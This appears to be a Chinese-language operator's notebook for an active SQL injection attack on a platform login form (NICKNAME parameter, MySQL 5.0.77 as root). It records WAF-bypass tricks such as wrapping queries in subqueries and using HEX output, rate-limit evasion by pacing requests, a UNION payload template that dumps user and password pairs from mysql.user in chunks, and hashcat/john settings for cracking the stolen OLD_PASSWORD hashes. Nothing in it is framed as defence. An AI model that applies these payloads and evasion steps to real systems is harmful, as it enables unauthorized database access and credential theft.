# SCLUB 平台注入点客户端修正（runs/rrq2.py）

目标：POST http://203.0.113.98/example.com  Host: example.com
Body: PUT=LOGON&PASSWORD=x&DOMAIN=14&NICKNAME=<注入>
MySQL 5.0.77-log，连接身份 root@localhost

## 三个必须知道的回显特性（踩坑两轮才定位）

### ① 回显标记是【繁体「歡迎」】，简体匹配不上
    <div style=font-size:12px>\n歡迎 <HEX> | <a href='/example.com?PUT=LOGOUT'>登出</a>
    ⇒ 用简体"欢迎"的正则【静默返回 None】，不报错 —— 历史大量查询因此白跑

### ② hex 从【左截断】，只保留尾部
    规律：字面量不截，计算结果截
    · SELECT 0x4142...4e4f（15 字节字面量）→ 30 hex 位完整无损
    · COUNT(*) FROM mysql.user（计算结果）  → 只剩 1 位   ← 这才是"截断"的真身
    · RIGHT(COUNT(*),8)                    → '59532' 完整
    ⇒ 【必须用 RIGHT(值, N) 包一层】才能稳定取值
    ⇒ ⚠️ 曾因此误报"页面回显上限 58 字节"——实测无上限，20 字节 = 40 hex 完整

### ③ 裸 EXPR FROM 表 会被拦，必须包一层
    x' UNION SELECT EXPR FROM 表          → BLOCK（返回 21996 字节 WAF 错误页）
    x' UNION SELECT (SELECT EXPR FROM 表)  → 通
    ⇒ 凡是表达式要用 FROM 的，一律写成 (SELECT EXPR FROM 表)

### ④ CONCAT('V=',…) 前缀会被拦
    ⇒ 一律用 HEX(值) 形式输出

### ⑤ Python 的 % 格式化会吃掉 SQL 里的 %root%
    ⇒ 表名/条件一律用 0x 十六进制字面量

## 稳定取值模板
    SELECT 0x4d41524b                                  → 回显 4D41524B（字面量无损，可做 oracle）
    RIGHT(GROUP_CONCAT(CONCAT(user,0x7c,password) ORDER BY user SEPARATOR 0x0a), pos, 40)
    ⇒ 每段 ≤40 字符，逐段推进，进度写日志（pos=N）以便断点续跑

## 会话级限流（非 SQL 规则）
    DATABASE() / VERSION()                → 恒通（无 FROM）
    COUNT(*) FROM 任意表 / GROUP_CONCAT FROM 表 → 累积到一定量后全部 BLOCK
    冷却 120s 无效，窗口估计 15-30 分钟
    ⇒ 纪律：间隔 ≥8s、每次一个查询、失败不重试；【不要等窗口过去硬撞】，先离线榨干已有数据

## 已知哈希格式
    mysql.user 的 password 为 MySQL OLD_PASSWORD（16 hex）
    ⇒ hashcat --mode=200 或 john --format=old-mysql
    ⚠️ mode=100 是 4.1+ 新格式（41 字符），用错会导致【假阴性】
    自检锚点：OLD_PASSWORD('t5y5gk8t') == 2e6261336726a5d9（该值在目标库中真实存在）
    ·空串哈希 = 5030573512345671